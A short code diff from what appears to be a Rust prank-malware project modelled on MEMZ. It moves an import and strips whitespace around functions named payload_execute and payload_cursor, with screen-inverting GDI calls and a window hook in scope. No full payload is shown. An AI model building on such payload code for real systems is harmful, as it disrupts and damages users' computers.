@@ -27,6 +27,7 @@ use crate::{
 };
 use windows::{
     core::{PCSTR, PCWSTR},
+    s, w,
     Win32::{
         Foundation::{HMODULE, HWND, LPARAM, POINT, RECT},
         Graphics::Gdi::{BitBlt, GetWindowDC, ReleaseDC, StretchBlt, NOTSRCCOPY, SRCCOPY},
@@ -40,7 +41,7 @@ use windows::{
                 SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
             },
         },
-    }, s, w,
+    },
 };
 
 pub const PAYLOADS: &[PAYLOAD] = &[
@@ -117,7 +118,7 @@ fn payload_execute(times: i32, _runtime: i32) -> i32 {
     )
     .expect("Failed ShellExecuteW()");
 
-    (1500.0 / (times as f32 / 15.0 + 1.0) + 100.0 + (rand::random::<f32>() % 200.0)) as i32  
+    (1500.0 / (times as f32 / 15.0 + 1.0) + 100.0 + (rand::random::<f32>() % 200.0)) as i32
 }
 
 fn payload_cursor(_times: i32, runtime: i32) -> i32 {
